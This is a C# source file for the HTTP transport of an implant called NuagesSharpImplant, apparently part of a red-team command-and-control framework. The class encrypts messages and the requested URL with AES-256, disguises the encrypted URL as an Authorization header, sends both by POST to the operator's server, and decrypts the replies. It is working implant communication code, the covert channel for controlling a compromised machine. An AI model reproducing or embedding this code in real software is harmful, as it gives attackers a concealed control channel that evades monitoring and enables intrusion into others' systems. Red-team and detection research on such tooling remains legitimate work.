using System;
using System.Collections.Generic;
using System.IO;
using System.Net;
using Newtonsoft.Json.Linq;
using System.Security.Cryptography;
using System.Text;


namespace NuagesSharpImplant
{
   
    public class HTTPAES256Connection : NuagesC2Connection
    {
        private string connectionString;

        private string handler = "PyAES256";

        private AESHelper aes;

        public int refreshrate;

        public int buffersize;

        public HTTPAES256Connection(string connectionString, string password, int buffersize, int refreshrate)
        {
            this.aes = new AESHelper(password);

            this.connectionString = connectionString;

            this.refreshrate = refreshrate;

            this.buffersize = buffersize;
        }

        public string getConnectionString()
        {
            return this.connectionString;
        }

        public string getHandler()
        {
            return this.handler;
        }

        public int getBufferSize()
        {
            return this.buffersize;
        }

        public int getRefreshRate()
        {
            return this.refreshrate;
        }


        public string POST(string url, string jsonContent)
        {
            byte[] byteArray = this.aes.EncryptString(jsonContent);

            byte[] EncUrl = this.aes.EncryptString(url);

            HttpWebRequest request = (HttpWebRequest)WebRequest.Create(this.connectionString);

            request.Method = "POST";

            UTF8Encoding encoding = new UTF8Encoding();

            request.Headers.Add("Authorization", Convert.ToBase64String(EncUrl, 0, EncUrl.Length));
            request.ContentLength = byteArray.Length;
            request.ContentType = @"application/x-www-form-urlencoded";

            using (Stream dataStream = request.GetRequestStream())
            {
                dataStream.Write(byteArray, 0, byteArray.Length);
            }

            using (HttpWebResponse response = (HttpWebResponse)request.GetResponse())
            {
                using (Stream responseStream = response.GetResponseStream())
                {
                    MemoryStream ms = new MemoryStream();
                    responseStream.CopyTo(ms);
                    byte[] bytes = ms.ToArray();
                    return this.aes.DecryptString(bytes);
                }
            }
        }
        class AESHelper
        {
            byte[] key;

            static byte[] Sha256(string rawData)
            {
                using (SHA256 sha256Hash = SHA256.Create())
                {
                    return sha256Hash.ComputeHash(Encoding.UTF8.GetBytes(rawData));

                }
            }

            public AESHelper(string password)
            {

                this.key = Sha256(password);

            }

            public byte[] EncryptString(string message)
            {
                var aes = new AesCryptoServiceProvider();
                aes.Mode = CipherMode.CBC;
                aes.KeySize = 256;
                aes.Padding = PaddingMode.PKCS7;
                byte[] iv = aes.IV;
                using (var memStream = new System.IO.MemoryStream())
                {
                    memStream.Write(iv, 0, iv.Length);
                    using (var cryptStream = new CryptoStream(memStream, aes.CreateEncryptor(this.key, aes.IV), CryptoStreamMode.Write))
                    {
                        using (var writer = new System.IO.StreamWriter(cryptStream))
                        {
                            writer.Write(message);
                        }
                    }
                    var buf = memStream.ToArray();
                    return buf;
                }
            }

            public string DecryptString(byte[] bytes)
            {
                //var bytes = Convert.FromBase64String(encryptedValue);
                var aes = new AesCryptoServiceProvider();
                aes.Mode = CipherMode.CBC;
                aes.Padding = PaddingMode.PKCS7;
                aes.KeySize = 256;
                using (var memStream = new System.IO.MemoryStream(bytes))
                {
                    var iv = new byte[16];
                    memStream.Read(iv, 0, 16);
                    using (var cryptStream = new CryptoStream(memStream, aes.CreateDecryptor(this.key, iv), CryptoStreamMode.Read))
                    {
                        using (var reader = new System.IO.StreamReader(cryptStream))
                        {
                            return reader.ReadToEnd();
                        }
                    }
                }
            }
        }
    }
}
